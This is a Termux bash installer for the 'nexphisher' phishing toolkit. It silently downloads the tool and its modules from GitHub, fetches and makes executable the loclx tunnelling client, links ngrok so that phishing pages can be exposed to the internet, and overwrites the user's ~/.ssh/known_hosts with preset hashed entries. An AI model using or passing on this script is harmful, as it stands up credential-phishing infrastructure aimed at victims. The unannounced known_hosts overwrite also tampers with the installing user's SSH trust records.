#!/data/data/com.termux/files/usr/bin/bash
IFS=$'\n\t'
wget --quiet https://raw.githubusercontent.com/htr-tech/nexphisher/master/nexphisher \
	-O ${PREFIX}/share/nexphisher/nexphisher
wget --tries=20 --quiet \
	https://raw.githubusercontent.com/htr-tech/nexphisher/master/Modules.zip \
	-O ${TMPDIR}/Modules.zip

if [[ -e ${TMPDIR}/Modules.zip ]]
then
	unzip -qq ${TMPDIR}/Modules.zip -d ${PREFIX}/share/nexphisher
	rm ${TMPDIR}/Modules.zip
else
	echo -en "\e[31mE:\e[0m Modules missing.\n"
fi

[[ ${PREFIX}/bin/ngrok ]] && [[ -e ${PREFIX}/share/nexphisher/.htr/ngrok ]] || {
	ln -s ${PREFIX}/bin/ngrok ${PREFIX}/share/nexphisher/.htr/ngrok
}

[[ -e ${PREFIX}/share/nexphisher/.htr/loclx ]] || {
	arch1=$(uname -a|grep -o 'arm'|head -n1)
	arch2=$(uname -a|grep -o 'Android'|head -n1)
	[[ $arch1 = 'arm' ]] || [[ $arch2 = 'Android' ]] && arch=arm || arch=386
	curl -sLO https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-$arch.zip \
		-o ${TMPDIR}/loclx-linux-$arch.zip
	[[ -e ${TMPDIR}/loclx-linux-$arch.zip ]] && {
		unzip -qq loclx-linux-$arch.zip -d ${PREFIX}/share/nexphisher/.htr;
		rm -rf ${TMPDIR}/loclx-linux-$arch.zip;
		chmod +x ${PREFIX}/share/nexphisher/.htr/loclx;
	}
}

[[ -d ${HOME}/.ssh ]] || mkdir ${HOME}/.ssh
printf "|1|SVjtt9mtL4P/5lsqaielF1pJHvM=|6QmJXxfPd9A5uUaFI1RV2H4brTs= ssh-rsa \n|1|PiraXMKgzzt9DdPRSLAtRvRad0Y=|2W162QXfHJvKKZWIaRyZO6VFWJI= ssh-rsa \n" > ${HOME}/.ssh/known_hosts
exit 0
####::: REPORT ISSUES AT https://t.me/Ivam3_Bot :::####
